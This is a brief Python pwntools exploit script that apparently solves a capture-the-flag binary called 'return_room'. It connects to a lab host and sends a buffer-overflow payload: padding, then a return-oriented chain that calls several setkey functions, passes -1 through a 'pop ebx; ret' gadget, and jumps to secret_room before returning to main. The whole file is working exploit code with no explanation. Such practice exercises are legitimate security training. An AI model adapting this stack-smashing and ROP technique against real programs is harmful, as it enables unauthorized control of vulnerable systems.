#!/usr/bin/env python3

import sys
from pwn import *

proc = remote("172.17.0.4", 6666)
#proc = process("/home/kali/Documents/SB/MidnightCTF/PWN/pwn/infra/3_return_room/return_room")

log.info(proc.recvuntil("? \n\n"))

payload  =  b'A' * 26
payload +=  p32(0x08049234) # setkey2()
payload +=  p32(0x08049263) # setkey3()
payload +=  p32(0x0804901e) # "pop ebx;ret"
payload +=  p32(0xffffffff) # value : -1
payload +=  p32(0x08049205) # setkey1()
payload +=  p32(0x080491a2) # secret_room()
payload +=  p32(0x080492d9) # ret2main :)

proc.sendline(payload)
proc.interactive()

#sys.stdout.buffer.write(payload)
